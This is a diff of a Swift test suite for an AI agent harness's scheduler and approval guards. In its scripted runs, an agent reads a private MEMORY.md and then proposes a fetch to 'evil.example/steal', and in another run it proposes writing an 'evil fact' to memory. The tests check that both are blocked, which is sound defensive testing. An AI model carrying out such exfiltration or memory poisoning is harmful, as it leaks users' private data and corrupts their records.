@@ -283,11 +283,11 @@ import Testing
     #expect(try second.jobCount() == 1)
   }
 
-  // MARK: - Clause 4 (§17-4): reduced privilege — would-park ⇒ hard DENY; no memory-write path
+  // MARK: - Clause 4 (§17-4 rev. §5.1): reduced privilege — a scheduled would-park PARKS the same
+  // durable approval an interactive run does (→ EXPIRED → DENY, Task 25); no memory-write path
 
-  @Test func clauseFourReducedPrivilegeHardDenies() async throws {
-    // given — a scheduled job whose runs (a) arm the trifecta then propose an exfil fetch, and
-    // (b) propose a memory write no tool serves
+  @Test func clauseFourScheduledTrifectaParksTheDurableApproval() async throws {
+    // given — a scheduled job whose run arms the trifecta then proposes an exfil fetch
     let evilURL = "https://evil.example/steal?d=1"
     let harness = try makeSC7Harness(
       scripts: [
@@ -296,16 +296,8 @@ import Testing
             ToolCall(id: "r1", name: "file_read", argumentsJSON: #"{"path":"MEMORY.md"}"#),
             webFetch("f1", evilURL),
           ]),
-          okResponse(
-            content: "I skipped the fetch — it needs your approval; run it interactively."
-          ),
-        ],
-        [
-          toolCallResponse([
-            ToolCall(id: "m1", name: "memory_write", argumentsJSON: #"{"text":"evil fact"}"#)
-          ]),
-          okResponse(content: "Nothing was stored."),
-        ],
+          okResponse(content: "fetched"),
+        ]
       ],
       workspaceFiles: ["MEMORY.md": "private plans for Operation Nightjar"]
     )
@@ -316,35 +308,55 @@ import Testing
       createdAt: Self.armMonday
     )
 
-    // when — fire (a): the trifecta fetch inside a non-interactive run
+    // when — the trifecta fetch inside a non-interactive run
     harness.clock.advance(to: Self.tueFire.addingTimeInterval(30))
     await harness.scheduler.tick()
-    let firstPayloads = try await harness.waitForOutbox(atLeast: 1)
-
-    // then — immediate audited DENY: no egress, no pending entry anywhere, note delivered
-    #expect(await harness.http.requestedURLs.isEmpty)
-    #expect(
-      firstPayloads.contains { payload in
-        payload.contains("needs your approval") && payload.contains("run it interactively")
+    let approval = try #require(
+      await pollUntil(timeout: .seconds(10)) {
+        try fetchApprovals(databasePath: harness.databasePath).first
       }
+    )
+
+    // then — the SAME durable park an interactive run takes (§5.1): no egress, a persisted
+    // PENDING approval, the run AWAITING_APPROVAL, and no ephemeral registry entry
+    #expect(await harness.http.requestedURLs.isEmpty)
+    #expect(approval.state == ApprovalState.pending.rawValue)
+    #expect(approval.tool == "web_fetch")
+    #expect(approval.reason == ApprovalReason.exfilTrifecta.rawValue)
+    #expect(
+      try runState(databasePath: harness.databasePath, runId: approval.runId)
+        == RunState.awaitingApproval.rawValue
     )
     let jobSessionId = try #require(try harness.stores.scheduledJobs.job(id: job.id)?.sessionId)
     #expect(await harness.registry.pending(sessionId: jobSessionId) == nil)
-    let denyRows = try harness.auditRows().filter { row in
-      row.action == "tool_call" && row.tool == "web_fetch" && row.decision == "error"
-    }
-    #expect(denyRows.count == 1)
-    // and the interactive park path was NEVER taken in this run
-    #expect(
-      try harness.auditRows().contains { row in
-        row.decision == "blocked_pending_approval"
-      } == false
+    let prompts = try await harness.waitForOutbox(atLeast: 1)
+    #expect(prompts.contains { payload in payload.contains("evil.example/steal") })
+  }
+
+  @Test func clauseFourMemoryWriteIsAutoDeniedByAbsence() async throws {
+    // given — a scheduled job whose run proposes a memory write no tool serves
+    let harness = try makeSC7Harness(
+      scripts: [
+        [
+          toolCallResponse([
+            ToolCall(id: "m1", name: "memory_write", argumentsJSON: #"{"text":"evil fact"}"#)
+          ]),
+          okResponse(content: "Nothing was stored."),
+        ]
+      ],
+      workspaceFiles: ["MEMORY.md": "private plans for Operation Nightjar"]
+    )
+    _ = try seedJob(
+      harness,
+      rule: dailySevenRule(),
+      next: Self.tueFire,
+      createdAt: Self.armMonday
     )
 
-    // when — fire (b): the memory-write proposal on the next occurrence
-    harness.clock.advance(to: Self.wedFire.addingTimeInterval(30))
+    // when — the memory-write proposal fires
+    harness.clock.advance(to: Self.tueFire.addingTimeInterval(30))
     await harness.scheduler.tick()
-    _ = try await harness.waitForOutbox(atLeast: 2)
+    _ = try await harness.waitForOutbox(atLeast: 1)
 
     // then — auto-denied by ABSENCE of the write path (spec §10/§16 case 4): unknown tool,
     // zero memory rows
